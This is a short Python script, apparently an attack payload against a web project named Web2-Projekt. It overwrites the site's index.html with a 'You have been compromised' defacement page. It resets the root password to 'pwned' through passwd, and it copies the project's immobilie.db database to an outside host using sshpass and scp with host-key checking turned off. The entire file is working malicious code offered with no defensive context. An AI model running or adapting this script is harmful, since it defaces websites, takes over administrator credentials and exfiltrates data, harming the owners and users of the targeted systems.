import os
import subprocess
#defacnement of website
malware = open("../Web2-Projekt/public/index.html","w+")
malware.write("<!DOCTYPE html><html><head><title>foobar</title><style>h1 {text-align: center;color: red</style></head><body><h1>You have been compromised</h1></body></html>")

#change-cred
subprocess.run('echo -n "pwned\npwned" | passwd root', shell=True)
os.system("sshpass -p PW scp -o StrictHostKeyChecking=no ../Web2-Projekt/immobilie.db host@IP:/home/user ")
